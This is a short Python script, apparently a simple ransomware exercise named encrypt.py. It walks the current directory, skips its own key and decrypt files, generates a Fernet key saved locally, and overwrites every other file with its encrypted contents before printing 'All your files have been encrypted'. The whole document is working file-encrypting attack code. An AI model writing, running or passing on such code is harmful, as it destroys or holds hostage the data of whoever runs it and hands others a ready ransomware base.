#!/usr/bin/env/ python3
from importlib.resources import contents
import os
import sys
from pathlib import Path
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "keyfile.key" or file == "decrypt.py":
            continue
    elif os.path.isfile(file):
            files.append(file)

print (files)

key = Fernet.generate_key()
#key = sys.argv[1].encode()

with open("keyfile.key", "wb") as keyfile:
        keyfile.write(key)

for file in files:
        with open(file, "rb") as thefile:
                content = thefile.read()

        contents_encrypted = Fernet(key).encrypt(content)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
print("All your files have been encrypted")